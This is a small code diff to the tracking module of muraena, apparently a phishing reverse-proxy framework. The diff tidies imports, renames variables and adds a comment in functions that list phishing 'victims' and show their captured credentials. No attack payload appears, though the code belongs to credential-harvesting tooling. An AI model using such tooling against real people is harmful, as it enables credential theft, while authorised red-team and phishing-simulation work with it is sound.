@@ -2,10 +2,12 @@ package tracking
 
 import (
 	"fmt"
+	"os"
+
 	"github.com/evilsocket/islazy/tui"
+
 	"github.com/muraenateam/muraena/core/db"
 	"github.com/muraenateam/muraena/log"
-	"os"
 )
 
 func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {
@@ -40,13 +42,13 @@ func (module *Tracker) ShowCredentials() {
 		module.Debug("error fetching all victims: %s", err)
 	}
 
-	for _, vId := range victims {
-		victim, err := db.GetVictim(vId)
+	for _, vID := range victims {
+		victim, err := db.GetVictim(vID)
 		if err != nil {
-			module.Debug("error fetching victim %s: %s", vId, err)
+			module.Debug("error fetching victim %s: %s", vID, err)
 		}
 
-		log.Info("Creds for victim %s: %d", vId, victim.CredsCount)
+		log.Info("Creds for victim %s: %d", vID, victim.CredsCount)
 
 		for i := 0; i < victim.CredsCount; i++ {
 			t := tui.Green(victim.ID)
@@ -65,6 +67,7 @@ func (module *Tracker) ShowCredentials() {
 
 }
 
+// ShowVictims prints the list of victims
 func (module *Tracker) ShowVictims() {
 
 	columns := []string{
